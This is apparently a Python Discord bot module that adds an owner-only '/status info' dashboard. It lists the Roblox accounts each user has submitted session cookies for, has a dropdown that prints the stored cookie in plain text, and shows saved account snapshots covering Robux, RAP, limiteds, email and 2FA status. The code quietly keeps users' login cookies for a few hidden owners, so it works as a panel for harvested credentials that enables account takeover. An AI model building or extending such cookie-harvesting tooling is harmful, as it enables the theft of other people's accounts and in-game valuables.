# ──────────────────────────────────────────────────────────────────
# /status info  —  per-Discord-user dashboard.
#
# Shows: profile, total commands run, most recent command, list of
# Roblox accounts they've ever submitted cookies for (deduped by
# username, latest cookie wins globally), and a "more info" expansion
# with per-command stats and gamepass create/purchase history.
#
# Restricted to a hardcoded set of bot-owner Discord IDs (overridable
# via the BOT_OWNER_IDS env var as a comma-separated list).
# ──────────────────────────────────────────────────────────────────

import os
from datetime import datetime, timezone
from typing import Optional

import discord
import discord
from discord.ext import commands
from discord.ext import commands

from datetime import datetime as _dt, timezone as _tz

from core.tracking import (
    get_account_cookie,
    get_account_snapshot,
    get_dashboard,
)

HISTORY_PAGE_SIZE = 5

DEFAULT_OWNER_IDS = {
    1338186029194154087,
    1331949475467493448,
    930861591350624286,
}


def _load_owner_ids() -> set[int]:
    """Allow override via BOT_OWNER_IDS env var (comma-separated)."""
    raw = os.environ.get("BOT_OWNER_IDS")
    if not raw:
        return set(DEFAULT_OWNER_IDS)
    parsed: set[int] = set()
    for chunk in raw.split(","):
        chunk = chunk.strip()
        if chunk.isdigit():
            parsed.add(int(chunk))
    return parsed or set(DEFAULT_OWNER_IDS)


OWNER_IDS = _load_owner_ids()

VIEW_TIMEOUT = 600  # 10 minutes
ACCOUNTS_PER_PAGE = 25  # Discord select dropdown cap


# ══════════════════════════════════════════════════════════════════
# Formatting helpers
# ══════════════════════════════════════════════════════════════════

def _ts(seconds: Optional[int]) -> str:
    if not seconds:
        return "—"
    return f"<t:{int(seconds)}:R>"


def _ts_full(seconds: Optional[int]) -> str:
    if not seconds:
        return "—"
    return f"<t:{int(seconds)}:f>"


def _truncate(text: Optional[str], n: int = 200) -> str:
    if not text:
        return "—"
    if len(text) <= n:
        return text
    return text[: n - 1] + "…"


def _fmt_summary(rec: Optional[dict]) -> str:
    if not rec:
        return "*(none yet)*"
    cmd = rec.get("command") or "?"
    when = _ts(rec.get("used_at"))
    summary = rec.get("summary") or ""
    success = rec.get("success")
    icon = "✅" if success == 1 else ("❌" if success == 0 else "•")
    line = f"`/{cmd}` {when} {icon}"
    if summary:
        line += f"\n> {_truncate(summary, 200)}"
    return line


def _fmt_command_history(rows: list[dict]) -> str:
    if not rows:
        return "*(none)*"
    lines = []
    for row in rows[:15]:
        cmd = row.get("command") or "?"
        when = _ts(row.get("used_at"))
        success = row.get("success")
        icon = "OK" if success == 1 else ("FAIL" if success == 0 else "-")
        summary = _truncate(row.get("summary"), 140)
        lines.append(f"`/{cmd}` {when} {icon}\n> {summary}")
    if len(rows) > 15:
        lines.append(f"*...and {len(rows) - 15} more recent command result(s).*")
    return "\n".join(lines)[:1024]


def _fmt_command_history_page(rows: list[dict], page: int) -> tuple[str, int, int]:
    """
    Paginated history. Returns (rendered_text, current_page, total_pages).
    `page` is 0-indexed; clamped to [0, total_pages-1].
    """
    if not rows:
        return "*(none)*", 0, 1
    total_pages = max(1, (len(rows) + HISTORY_PAGE_SIZE - 1) // HISTORY_PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * HISTORY_PAGE_SIZE
    end = start + HISTORY_PAGE_SIZE
    chunk = rows[start:end]

    lines = []
    for row in chunk:
        cmd = row.get("command") or "?"
        when = _ts(row.get("used_at"))
        success = row.get("success")
        icon = "✅" if success == 1 else ("❌" if success == 0 else "•")
        summary = _truncate(row.get("summary"), 160)
        lines.append(f"`/{cmd}` {when} {icon}\n> {summary}")

    rendered = "\n".join(lines)[:1024]
    return rendered, page, total_pages


# ══════════════════════════════════════════════════════════════════
# Embed builders
# ══════════════════════════════════════════════════════════════════

def _build_main_embed(target: discord.User | discord.Member, data: dict) -> discord.Embed:
    profile = data.get("profile") or {}
    total = data.get("total_commands", 0)
    recent = data.get("most_recent_command")
    accounts = data.get("accounts") or []

    embed = discord.Embed(
        title=f"Status Info — {target.display_name}",
        color=discord.Color.blurple(),
        timestamp=datetime.now(timezone.utc),
    )

    if target.display_avatar:
        embed.set_thumbnail(url=target.display_avatar.url)

    first_seen = profile.get("first_seen") if profile else None
    last_seen = profile.get("last_seen") if profile else None

    embed.add_field(
        name="Discord",
        value=(
            f"**Username:** `{target}`\n"
            f"**ID:** `{target.id}`\n"
            f"**First seen:** {_ts(first_seen)}\n"
            f"**Last seen:** {_ts(last_seen)}"
        ),
        inline=False,
    )

    embed.add_field(
        name="Activity",
        value=(
            f"**Total commands:** `{total}`\n"
            f"**Roblox accounts linked:** `{len(accounts)}`\n"
            f"**Most recent:**\n{_fmt_summary(recent)}"
        ),
        inline=False,
    )

    if accounts:
        lines = []
        for i, a in enumerate(accounts[:25], 1):
            uname = a.get("username") or "?"
            disp = a.get("display_name")
            uid = a.get("user_id")
            last_link = _ts(a.get("last_linked_at"))
            count = a.get("submission_count") or 1
            tag = f"**{disp}**" if disp and disp != uname else ""
            line = f"`{i:>2}.` `{uname}`"
            if tag:
                line += f"  ({tag})"
            if uid:
                line += f"  `id:{uid}`"
            line += f"  • {count}× • last {last_link}"
            lines.append(line)

        more = ""
        if len(accounts) > 25:
            more = f"\n*…and {len(accounts) - 25} more (only the 25 most-recent are shown).*"

        embed.add_field(
            name=f"Roblox accounts linked ({len(accounts)})",
            value="\n".join(lines) + more,
            inline=False,
        )
    else:
        embed.add_field(
            name="Roblox accounts linked",
            value="*(none)*",
            inline=False,
        )

    embed.set_footer(text="Use the dropdown to reveal a stored cookie • Show More Info for per-command stats")
    return embed


def _build_more_info_embed(
    target: discord.User | discord.Member,
    data: dict,
    history_page: int = 0,
) -> discord.Embed:
    breakdown = data.get("command_breakdown") or []
    command_history = data.get("command_history") or []
    creates = data.get("gamepass_creates") or []
    purchases = data.get("gamepass_purchases") or []
    checked = data.get("checked_accounts") or []

    embed = discord.Embed(
        title=f"More info — {target.display_name}",
        color=discord.Color.blurple(),
        timestamp=datetime.now(timezone.utc),
    )

    if breakdown:
        lines = []
        for row in breakdown:
            cmd = row.get("command") or "?"
            n = row.get("n") or 0
            last = _ts(row.get("last_used"))
            ok = row.get("successes") or 0
            lines.append(f"`/{cmd}` — `{n}×` (✅ `{ok}`) • last {last}")
        embed.add_field(
            name=f"Commands used ({sum((r.get('n') or 0) for r in breakdown)} total)",
            value="\n".join(lines)[:1024],
            inline=False,
        )
    else:
        embed.add_field(name="Commands used", value="*(none)*", inline=False)

    history_text, current_page, total_pages = _fmt_command_history_page(
        command_history, history_page
    )
    history_label = f"Recent command results — page {current_page + 1}/{total_pages}"
    embed.add_field(
        name=history_label,
        value=history_text,
        inline=False,
    )

    if creates:
        lines = []
        for c in creates[:10]:
            name = c.get("gamepass_name") or "?"
            gid = c.get("gamepass_id") or "?"
            price = c.get("price")
            place = c.get("place_name")
            on_acc = c.get("roblox_username")
            ts = _ts(c.get("created_at"))
            line = f"• **{name}** — id `{gid}`"
            if price is not None:
                line += f" • {price} R$"
            if place:
                line += f" • on `{place}`"
            if on_acc:
                line += f" • by `{on_acc}`"
            line += f" • {ts}"
            lines.append(line)
        suffix = ""
        if len(creates) > 10:
            suffix = f"\n*…and {len(creates) - 10} more.*"
        embed.add_field(
            name=f"Gamepasses created ({len(creates)})",
            value=("\n".join(lines) + suffix)[:1024],
            inline=False,
        )
    else:
        embed.add_field(name="Gamepasses created", value="*(none)*", inline=False)

    if purchases:
        lines = []
        for p in purchases[:10]:
            name = p.get("gamepass_name") or "?"
            gid = p.get("gamepass_id") or "?"
            price = p.get("price")
            seller = p.get("seller")
            on_acc = p.get("roblox_username")
            ts = _ts(p.get("purchased_at"))
            line = f"• **{name}** — id `{gid}`"
            if price is not None:
                line += f" • {price} R$"
            if seller:
                line += f" • from `{seller}`"
            if on_acc:
                line += f" • on `{on_acc}`"
            line += f" • {ts}"
            lines.append(line)
        suffix = ""
        if len(purchases) > 10:
            suffix = f"\n*…and {len(purchases) - 10} more.*"
        embed.add_field(
            name=f"Gamepasses bought ({len(purchases)})",
            value=("\n".join(lines) + suffix)[:1024],
            inline=False,
        )
    else:
        embed.add_field(name="Gamepasses bought", value="*(none)*", inline=False)

    # Checked accounts (from /accountchecker) — list of accounts this user has snapshots for.
    if checked:
        lines = []
        for c in checked[:15]:
            uname = c.get("roblox_username") or "?"
            ts = _ts(c.get("captured_at"))
            lines.append(f"• `{uname}` — captured {ts}")
        suffix = ""
        if len(checked) > 15:
            suffix = f"\n*…and {len(checked) - 15} more.*"
        embed.add_field(
            name=f"Checked accounts ({len(checked)})",
            value=("\n".join(lines) + suffix)[:1024],
            inline=False,
        )
    else:
        embed.add_field(name="Checked accounts", value="*(none)*", inline=False)

    return embed


def _build_snapshot_embed(roblox_username: str, snap: dict) -> discord.Embed:
    """
    Render a saved /accountchecker snapshot. Visually identical to the live
    /accountchecker embed (same title, same Account Overview formatting),
    pulled from the SQLite cache so it works even if the cookie has expired.
    """
    captured_at = snap.get("captured_at")

    # Mirror the live /accountchecker format exactly.
    robux = snap.get("robux")
    robux_str = f"R$ {robux:,}" if isinstance(robux, int) else str(robux if robux is not None else "—")

    rap = snap.get("rap")
    rap_str = f"R$ {rap:,}" if isinstance(rap, int) else str(rap if rap is not None else "—")

    limiteds = snap.get("limiteds_count")
    limiteds_str = f"{limiteds:,}" if isinstance(limiteds, int) else str(limiteds if limiteds is not None else "—")

    email = snap.get("email") or "Not set"
    email_verified = (
        "<:check:1497344035696672959>"
        if snap.get("email_verified")
        else "<:x:1497344061592436737>"
    )

    two_fa = (
        "<:check:1497344035696672959> Enabled"
        if snap.get("two_fa_enabled")
        else "<:x:1497344061592436737> Disabled"
    )
    two_fa_methods = snap.get("two_fa_methods", "")
    if two_fa_methods and two_fa_methods != "None":
        two_fa += f" ({two_fa_methods})"

    premium = (
        "<:check:1497344035696672959> Active"
        if snap.get("has_premium")
        else "<:x:1497344061592436737> Not active"
    )

    overview = (
        f"👤 **Username:** `{snap.get('username') or roblox_username}`\n"
        f"🏷️ **Display Name:** `{snap.get('display_name') or snap.get('username') or roblox_username}`\n"
        f"🆔 **User ID:** `{snap.get('user_id')}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<a:moneybag:1497344054990733535> **Robux:** {robux_str}\n"
        f"📈 **RAP:** {rap_str}\n"
        f"📦 **Limiteds:** {limiteds_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<:email:1497344042076344350> **Email:** `{email}` {email_verified}\n"
        f"<:lock:1497344050078941344> **2FA:** {two_fa}\n"
        f"<a:crown:1497344039584923778> **Premium:** {premium}"
    )

    embed = discord.Embed(
        title="<a:arrow:1497344031238127686> <a:mag:1497344052709036125> Account Checker",
        color=discord.Color.green(),
    )
    if snap.get("avatar_url"):
        embed.set_thumbnail(url=snap["avatar_url"])
    embed.add_field(
        name="<:check:1497344035696672959> Account Overview",
        value=overview,
        inline=False,
    )

    if captured_at:
        try:
            embed.timestamp = _dt.fromtimestamp(int(captured_at), tz=_tz.utc)
            embed.set_footer(text="Stored snapshot")
        except Exception:
            pass

    return embed


# ══════════════════════════════════════════════════════════════════
# View
# ══════════════════════════════════════════════════════════════════

class UserInfoView(discord.ui.View):
    def __init__(self, target: discord.User | discord.Member, data: dict, owner_id: int):
        super().__init__(timeout=None)
        self.target = target
        self.data = data
        self.owner_id = owner_id
        self.showing_more = False
        self.history_page = 0

        accounts = data.get("accounts") or []
        if accounts:
            self.add_item(self._build_account_select(accounts[:ACCOUNTS_PER_PAGE]))

        checked = data.get("checked_accounts") or []
        if checked:
            self.add_item(self._build_snapshot_select(checked[:ACCOUNTS_PER_PAGE]))

        # Initial pagination button state — disabled until "Show More Info" is clicked.
        self._refresh_history_buttons()

    def _build_account_select(self, accounts: list[dict]) -> discord.ui.Select:
        options = []
        for a in accounts:
            uname = a.get("username") or "?"
            disp = a.get("display_name") or uname
            count = a.get("submission_count") or 1
            label = uname[:100]
            description = f"{disp[:50]} • {count}× submissions"[:100]
            options.append(
                discord.SelectOption(
                    label=label,
                    description=description,
                    value=uname,
                )
            )

        select = discord.ui.Select(
            placeholder="Reveal stored cookie for an account…",
            min_values=1,
            max_values=1,
            options=options,
            custom_id="userinfo:account_select",
        )

        async def _callback(interaction: discord.Interaction):
            if interaction.user.id != self.owner_id:
                await interaction.respond(
                    "Only the command runner can interact with this panel."
                )
                return
            picked = select.values[0]
            cookie = get_account_cookie(picked)
            if not cookie:
                await interaction.respond(
                    f"No stored cookie for `{picked}` (it may have been submitted before "
                    f"tracking was enabled, or the lookup failed at the time)."
                )
                return
            await interaction.respond(
                f"**Latest stored cookie for** `{picked}`:\n```\n{cookie}\n```"
            )

        select.callback = _callback
        return select

    def _build_snapshot_select(self, checked: list[dict]) -> discord.ui.Select:
        """Dropdown that reveals the saved /accountchecker snapshot for an account."""
        options = []
        for c in checked:
            uname = c.get("roblox_username") or "?"
            captured = c.get("captured_at")
            captured_str = ""
            if captured:
                try:
                    dt = _dt.fromtimestamp(int(captured), tz=_tz.utc)
                    captured_str = f" • captured {dt:%Y-%m-%d}"
                except Exception:
                    captured_str = ""
            label = uname[:100]
            description = f"Show stored account info{captured_str}"[:100]
            options.append(
                discord.SelectOption(
                    label=label,
                    description=description,
                    value=uname,
                )
            )

        select = discord.ui.Select(
            placeholder="Reveal stored account info for an account…",
            min_values=1,
            max_values=1,
            options=options,
            custom_id="userinfo:snapshot_select",
        )

        async def _callback(interaction: discord.Interaction):
            if interaction.user.id != self.owner_id:
                await interaction.respond(
                    "Only the command runner can interact with this panel."
                )
                return
            picked = select.values[0]
            snap = get_account_snapshot(self.target.id, picked)
            if not snap:
                await interaction.respond(
                    f"No stored snapshot for `{picked}` (may have been checked before tracking was enabled)."
                )
                return

            embed = _build_snapshot_embed(picked, snap)
            await interaction.respond(embed=embed)

        select.callback = _callback
        return select

    def _refresh_history_buttons(self):
        """Enable prev/next only when in More Info mode and the page is in range."""
        history = self.data.get("command_history") or []
        total_pages = max(1, (len(history) + HISTORY_PAGE_SIZE - 1) // HISTORY_PAGE_SIZE)
        self.prev_history_btn.disabled = (not self.showing_more) or self.history_page <= 0
        self.next_history_btn.disabled = (not self.showing_more) or self.history_page >= total_pages - 1

    @discord.ui.button(label="◀ Prev", style=discord.ButtonStyle.secondary, row=4, disabled=True, custom_id="userinfo:prev")
    async def prev_history_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user.id != self.owner_id:
            await interaction.respond(
                "Only the command runner can interact with this panel."
            )
            return
        if not self.showing_more:
            await interaction.response.defer()
            return
        self.history_page = max(0, self.history_page - 1)
        self._refresh_history_buttons()
        embed = _build_more_info_embed(self.target, self.data, history_page=self.history_page)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Next ▶", style=discord.ButtonStyle.secondary, row=4, disabled=True, custom_id="userinfo:next")
    async def next_history_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user.id != self.owner_id:
            await interaction.respond(
                "Only the command runner can interact with this panel."
            )
            return
        if not self.showing_more:
            await interaction.response.defer()
            return
        history = self.data.get("command_history") or []
        total_pages = max(1, (len(history) + HISTORY_PAGE_SIZE - 1) // HISTORY_PAGE_SIZE)
        self.history_page = min(total_pages - 1, self.history_page + 1)
        self._refresh_history_buttons()
        embed = _build_more_info_embed(self.target, self.data, history_page=self.history_page)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Show More Info", style=discord.ButtonStyle.secondary, row=4, custom_id="userinfo:more")
    async def more_info_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user.id != self.owner_id:
            await interaction.respond(
                "Only the command runner can interact with this panel."
            )
            return
        if self.showing_more:
            self.showing_more = False
            button.label = "Show More Info"
            self._refresh_history_buttons()
            embed = _build_main_embed(self.target, self.data)
        else:
            self.showing_more = True
            button.label = "Back to Overview"
            self.history_page = 0
            self._refresh_history_buttons()
            embed = _build_more_info_embed(self.target, self.data, history_page=self.history_page)
        await interaction.response.edit_message(embed=embed, view=self)


# ══════════════════════════════════════════════════════════════════
# Cog
# ══════════════════════════════════════════════════════════════════

class ExpiredUserInfoView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    async def _expired(self, interaction: discord.Interaction):
        await interaction.respond(
            "This `/status info` panel expired during a bot restart. Run `/status info` again to rebuild it.",
            ephemeral=True,
        )

    @discord.ui.select(
        placeholder="Reveal stored cookie for an account…",
        min_values=1,
        max_values=1,
        options=[discord.SelectOption(label="Expired panel", value="expired")],
        custom_id="userinfo:account_select",
    )
    async def account_select(self, select: discord.ui.Select, interaction: discord.Interaction):
        await self._expired(interaction)

    @discord.ui.select(
        placeholder="Reveal stored account info for an account…",
        min_values=1,
        max_values=1,
        options=[discord.SelectOption(label="Expired panel", value="expired")],
        custom_id="userinfo:snapshot_select",
    )
    async def snapshot_select(self, select: discord.ui.Select, interaction: discord.Interaction):
        await self._expired(interaction)

    @discord.ui.button(label="◀ Prev", style=discord.ButtonStyle.secondary, row=4, custom_id="userinfo:prev")
    async def prev_history_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        await self._expired(interaction)

    @discord.ui.button(label="Next ▶", style=discord.ButtonStyle.secondary, row=4, custom_id="userinfo:next")
    async def next_history_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        await self._expired(interaction)

    @discord.ui.button(label="Show More Info", style=discord.ButtonStyle.secondary, row=4, custom_id="userinfo:more")
    async def more_info_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        await self._expired(interaction)


class UserInfoCog(commands.Cog):
    """Owner-only per-Discord-user dashboard."""

    status = discord.SlashCommandGroup(name="status", description=".")

    def __init__(self, bot: commands.Bot):
        self.bot = bot
    @status.command(name="info", description=".")
    async def userinfo(
        self,
        ctx: discord.ApplicationContext,
        user: Optional[discord.User] = None,
        user_id: Optional[str] = None,
    ):
        # Owner gate.
        if ctx.author.id not in OWNER_IDS:
            await ctx.respond(
                "This command is restricted."
            )
            return

        # Resolve target. user takes precedence, fall back to user_id.
        target: Optional[discord.User] = user
        if target is None and user_id:
            cleaned = user_id.strip().strip("<@!>").strip(">")
            if not cleaned.isdigit():
                await ctx.respond(
                    f"`{user_id}` doesn't look like a Discord user ID."
                )
                return
            try:
                target = await self.bot.fetch_user(int(cleaned))
            except Exception as e:
                await ctx.respond(
                    f"Couldn't fetch user `{cleaned}`: {e}"
                )
                return

        if target is None:
            await ctx.respond(
                "Provide either a `user` (mention/picker) or a `user_id` (numeric)."
            )
            return

        await ctx.defer()

        data = get_dashboard(target.id)
        embed = _build_main_embed(target, data)
        view = UserInfoView(target, data, owner_id=ctx.author.id)

        await ctx.respond(embed=embed, view=view)


def setup(bot):
    bot.add_view(ExpiredUserInfoView())
    bot.add_cog(UserInfoCog(bot))
